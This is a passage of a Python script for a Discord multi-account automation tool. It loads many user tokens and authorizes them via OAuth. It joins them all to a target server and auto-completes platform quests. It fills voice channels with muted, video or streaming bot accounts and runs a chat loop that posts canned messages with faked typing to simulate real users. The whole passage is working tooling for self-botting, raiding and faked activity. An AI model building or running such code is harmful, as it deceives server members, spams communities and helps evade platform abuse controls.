                log_warn(f"Smart chat error: {e}")
                await asyncio.sleep(5)
    else:
        static_msgs = [
            "yo whats up", "anyone alive?", "whats good yall", "how is it going",
            "heyy", "hey", "sup", "chat is quiet", "wsg", "wsp"
        ]
        msg_idx = 0
        while not stop_event.is_set():
            try:
                idx = msg_idx % len(tokens)
                token = tokens[idx]
                tag = f"Token[{idx}]"
                
                msg_content = random.choice(static_msgs)
                log_warn(f"{tag} ├─> active in conversation...")
                await trigger_typing(token, channel_id)
                await asyncio.sleep(len(msg_content) * 0.05 + 0.3)
                
                success, _ = await send_msg(token, channel_id, msg_content)
                if success:
                    log_ok(f"{tag} └─> sent: {msg_content}")
                else:
                    log_fail(f"{tag} └─> failed to send message")
                
                msg_idx += 1
                await asyncio.sleep(delay + random.uniform(0.5, 2.0))
            except Exception as e:
                log_warn(f"Static chat error: {e}")
                await asyncio.sleep(5)

async def main():
    show_banner()
    cfg = load_config()
    tokens = load_tokens()
    
    if not tokens:
        log_fail("No tokens loaded from tokens.txt. Please populate tokens.txt first.")
        input("  Press Enter to exit...")
        sys.exit(1)
        
    log_info("Verifying connections...")
    info = await verify_token(tokens[0])
    if info is None:
        log_fail("Could not authenticate first token. Check your credentials.")
        return
    uname, disc = info
    spin_result(f"CONNECTED · {uname}#{disc} · {len(tokens)} token(s) loaded", MINT)
    
    # ── target servers
    box("INITIALIZATION", EMBER)
    invite_input = ask("Server invite link or code", hint="e.g. https://discord.gg/invite")
    info = resolve_invite(invite_input)
    if not info:
        log_fail("Invalid server invite link or code")
        input("  Press Enter to exit...")
        sys.exit(1)
        
    guild_id = info["guild_id"]
    invite_code = info["invite_code"]
    log_ok(f"Guild identified: {info['guild_name']} ({guild_id})")
    
    # ── channel configuration
    box("TARGET CHANNELS", LAVA)
    vc_id = ask("Voice Channel ID", hint="leave empty to skip VC")
    text_id = ask("Text Channel ID", hint="leave empty to skip Chat")
    
    if not vc_id and not text_id:
        log_fail("Both Voice and Text channels are empty. Nothing to execute.")
        input(f"  {Fore.WHITE}Press Enter to exit...")
        sys.exit(1)
        
    mute_c = 0
    vid_c = 0
    str_c = 0
    if vc_id:
        box("VC CONFIGURATION", GOLD)
        mute_c = ask_int("VC Mute amount", hint=f"default={len(tokens)}")
        if mute_c == 0:
            mute_c = len(tokens)
        vid_c = ask_int("VC Video amount", hint="default=0")
        str_c = ask_int("VC Stream amount", hint="default=0")
        
    delay = 5
    smart_opt = True
    if text_id:
        box("CHAT CONFIGURATION", PURPLE)
        delay = ask_int("Chat Delay in seconds", hint="default=5")
        if delay == 0:
            delay = 5
        smart_opt = ask("Smart Chat Mode? (y/n)", hint="[y / n] default=y").lower() != "n"
        
    divider()
    
    # 0. Quest Completer
    qc_cfg = cfg.get("quest_completer", {})
    if qc_cfg.get("enabled", True):
        box("QUEST COMPLETER", MINT)
        log_info("Running Quest Completer (enroll + video progress)...")
        completed_quest_ids = run_quest_completer(qc_cfg)
        if completed_quest_ids:
            log_ok(f"Quest Completer finished \u2014 {len(completed_quest_ids)} quest(s) processed")
        else:
            log_warn("Quest Completer \u2014 no quests completed or found")
        divider()
    
    # 1. OAuth2 authorization
    box("AUTHORIZATION", EMBER)
    log_info("Authorizing tokens via OAuth...")
    authed = []
    with ThreadPoolExecutor(max_workers=cfg.get("max_workers", 10)) as ex:
        futs = [ex.submit(oauth_authorize, t, cfg) for t in tokens]
        for f in as_completed(futs):
            res = f.result()
            if res:
                authed.append(res)
    log_ok(f"Authorized: {len(authed)}/{len(tokens)}")
    
    # 2. Join server
    box("MEMBERSHIP", LAVA)
    bot_token = cfg.get("bot_token")
    joined = 0
    log_info("Checking server memberships & joining server...")
    for uid, at, tk in authed:
        in_guild = await check_membership(tk, guild_id)
        if not in_guild:
            success = False
            if bot_token and "YOUR_BOT_TOKEN" not in bot_token:
                success = await join_via_oauth2(bot_token, guild_id, uid, at)
            if not success:
                success = await join_via_invite(tk, invite_code)
                
            if success:
                joined += 1
            else:
                log_fail(f"Token {tk[:15]}... failed to join server")
        else:
            joined += 1
            
    log_ok(f"Successfully connected to server: {joined}/{len(authed)}")
    if joined == 0:
        log_fail("No tokens could enter the server. Exiting.")
        input("  Press Enter to exit...")
        sys.exit(1)
        
    # 3. Deployment
    box("DEPLOYMENT", GOLD)
    log_info("Starting automatic deployment...")
    
    stop_event = asyncio.Event()
    tasks = []
    
    # Deploy Voice presence if enabled
    if vc_id:
        log_info("Spawning VC joiner processes...")
        for i, a in enumerate(authed):
            mute = i < mute_c
            video = mute_c <= i < (mute_c + vid_c)
            stream = (mute_c + vid_c) <= i < (mute_c + vid_c + str_c)
            tasks.append(asyncio.create_task(vc_connect(a[2], guild_id, vc_id, mute, video, stream, i, stop_event)))
            await asyncio.sleep(0.3)
            
    # Deploy Chat presence if enabled
    if text_id:
        log_info("Spawning chat automation process...")
        chat_tokens = [a[2] for a in authed]
        tasks.append(asyncio.create_task(start_chat_loop(chat_tokens, text_id, delay, smart_opt, stop_event)))
        
    log_ok("Deployment finished! Running concurrently. Press Ctrl+C to terminate...")
    print("")
    
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        pass
    except KeyboardInterrupt:
        log_warn("Termination signal received. Cleaning up...")
    finally:
        stop_event.set()
        for t in tasks:
            t.cancel()
        log_ok("All processes stopped successfully.")
        time.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log_warn("Exited.")
